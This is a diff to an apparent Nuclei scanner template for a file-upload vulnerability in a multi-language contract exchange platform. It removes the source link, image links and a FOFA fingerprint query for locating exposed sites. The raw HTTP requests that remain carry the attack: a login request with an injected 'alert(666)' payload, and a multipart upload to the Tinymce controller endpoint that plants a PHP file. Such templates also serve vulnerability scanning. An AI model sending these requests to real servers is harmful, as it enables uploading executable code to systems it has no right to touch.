@@ -3,12 +3,8 @@ info:
   name: 10005-19国语言合约交易所系统upload_token文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nfo9fgllmslqgutf'
+  description: ''
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nfo9fgllmslqgutf
-    fofa: icon_hash="-441541656" || "static/libs/swiper-5.3.8"
 http:
 - raw:
   - 'POST /admin/auth/login HTTP/1.1
@@ -37,7 +33,6 @@ http:
 
     r=alert(666);>&password=111111
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1749380917018-9a3424d8-83b3-4913-a9dd-5b5833827def.png)
 
     位于 /vendor/dcat/laravel-admin/src/Controllers/TinymceController.php 控制器利⽤
 
@@ -78,9 +73,7 @@ http:
 
     <?php phpinfo();?>
 
-    ------WebKitFormBoundaryzAKBjt33dEezyqIc--
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1749380917230-25a793fc-7c6a-43d7-b72d-86e817181e69.png)'
+    ------WebKitFormBoundaryzAKBjt33dEezyqIc--'
   redirects: false
   matchers:
   - status:
